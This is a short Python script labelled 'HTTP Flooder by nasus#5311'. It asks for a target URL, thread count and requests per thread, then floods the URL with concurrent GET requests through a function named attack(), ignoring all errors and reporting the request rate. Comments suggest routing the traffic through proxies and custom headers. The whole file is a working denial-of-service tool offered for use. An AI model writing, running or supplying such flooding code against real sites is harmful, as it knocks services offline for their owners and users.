py
import time, random, threading, requests

start_time = time.time()
total_requests = 0
proxies = {} # change requests to
headers = {} # requests.get(url, proxies=proxies, headers=headers)

def attack():
    global num_requests, url, total_requests
    for i in range(num_requests):
        try:
            total_requests += 1 
            requests.get(url)
        except:
            pass
          
          
if __name__ == "__main__":
    print("HTTP Flooder by nasus#5311\n")
    url = input("\nURL: ")
    num_threads = int(input("threads: "))
    num_requests = int(input("requests per thread: "))
    url = url + str(random.randint(0, 100))
    
    all_threads = []
    for i in range(num_threads):
        thread = threading.Thread(target=attack, daemon=True)
        thread.start()
        all_threads.append(thread)
    for current_thread in all_threads:
        current_thread.join()
    
    print(f"\nrequests sent: {total_requests}\ntime: {time.time() - start_time}\n\nrate: {total_requests / (time.time() - start_time)} requests/s")
